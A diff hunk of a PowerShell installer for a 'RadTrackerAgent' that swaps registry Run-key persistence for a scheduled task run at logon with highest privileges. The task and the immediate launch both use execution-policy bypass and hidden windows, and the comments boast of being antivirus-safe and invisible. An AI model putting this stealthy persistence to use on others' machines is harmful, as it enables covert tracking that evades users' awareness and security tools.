@@ -172,23 +172,23 @@ try {
     } | Stop-Process -Force -ErrorAction SilentlyContinue
 } catch { }
 
-# 1. Official Windows Task Scheduler (100% Antivirus Safe, Clean Official Scheduler, 0% Visible Window) (100% Antivirus Safe, Clean Official Scheduler)
+# 1. Clean up any rogue Registry Run keys (Registry Run keys cause visible console popups on boot)
+try {
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "RadTrackerAgent" -ErrorAction SilentlyContinue | Out-Null
+    Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "RadTrackerAgent" -ErrorAction SilentlyContinue | Out-Null
+} catch { }
+
+# 2. Register Official Windows Task Scheduler (100% Invisible, Hidden Task, Starts at Boot/Logon)
+$taskActionCmd = "powershell.exe -ExecutionPolicy Bypass -NonInteractive -WindowStyle Hidden -NoProfile -File `"$TargetPs1`""
 try {
     schtasks /Delete /TN $TaskName /F 2>$null | Out-Null
-    schtasks /Create /F /TN $TaskName /SC ONLOGON /RL HIGHEST /TR "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File `"$TargetPs1`"" 2>$null | Out-Null
+    schtasks /Create /F /TN $TaskName /SC ONLOGON /RL HIGHEST /TR "$taskActionCmd" 2>$null | Out-Null
     schtasks /Run /TN $TaskName 2>$null | Out-Null
 } catch { }
 
-# 2. Registry Run Key Fallback (Works for standard users without Task Scheduler)
+# 3. Start background runner now silently
 try {
-    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $regCmd = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File `"$TargetPs1`""
-    Set-ItemProperty -Path $regPath -Name "RadTrackerAgent" -Value $regCmd -Force -ErrorAction SilentlyContinue | Out-Null
-} catch { }
-
-# 3. Start background runner now
-try {
-    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File `"$TargetPs1`"" -WindowStyle Hidden
+    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -NonInteractive -WindowStyle Hidden -NoProfile -File `"$TargetPs1`"" -WindowStyle Hidden
 } catch { }
 
 Write-Host ""
